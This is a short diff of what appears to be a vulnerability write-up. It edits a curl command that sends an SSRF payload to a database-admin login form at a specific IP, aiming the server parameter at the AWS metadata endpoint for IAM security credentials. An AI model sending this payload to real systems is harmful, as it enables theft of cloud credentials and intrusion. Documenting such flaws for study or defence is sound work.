@@ -140,7 +140,7 @@ curl -v -X POST 'http://2.12.85.6:8080/' \
 ```
 curl -X POST -v \
   -H "Content-Type: application/x-www-form-urlencoded" \
-  -d "auth[driver]=elasticsearch&auth[server]=http://169.254.169.254/latest/meta-data/iam/security-credentials/ИМЯ_РОЛИ/&auth[username]=&auth[db]=" \
+  -d "auth[driver]=elasticsearch&auth[server]=http://169.254.169.254/latest/meta-data/iam/security-credentials/specific_name/&auth[username]=&auth[db]=" \
   http://2.12.85.6:8080/
 ```   
 ---
